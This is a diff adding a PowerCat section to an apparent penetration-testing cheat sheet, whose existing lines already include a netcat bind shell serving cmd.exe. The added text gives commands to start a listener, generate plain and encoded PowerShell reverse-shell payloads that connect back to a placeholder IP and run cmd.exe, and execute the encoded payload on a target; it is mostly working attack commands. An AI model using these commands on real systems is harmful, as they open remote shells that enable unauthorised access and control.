@@ -30,6 +30,37 @@ nc -nlvp 51337 -e cmd.exe
 
 ## Reverse Shells
 
+### PowerCat
+
+For powercat, a payload is a set of PowerShell instructions **\(Can be detected by AV and IDS\)**
+
+Set up a listener:
+
+```text
+nc -lnvp 443
+```
+
+Generate a payload:
+
+```text
+powercat -c IP -p PORT -e cmd.exe -g > reverse_shell.ps1
+```
+
+Generate an encoded payload instead with:
+
+```text
+powercat -c IP -p PORT -e cmd.exe -ge > encoded_rev_shell.ps1
+```
+
+Copy to the `encoded_rev_shell.ps1`  contents to the clipboard, paste it in the target, and execute it with:
+
+```text
+powershell.exe -E asjdfasdfsdfaf
+
+```
+
+Hit Enter again to execute the encoded command.
+
 ### ICMP with Nishang + ICMPsh
 
 ```text
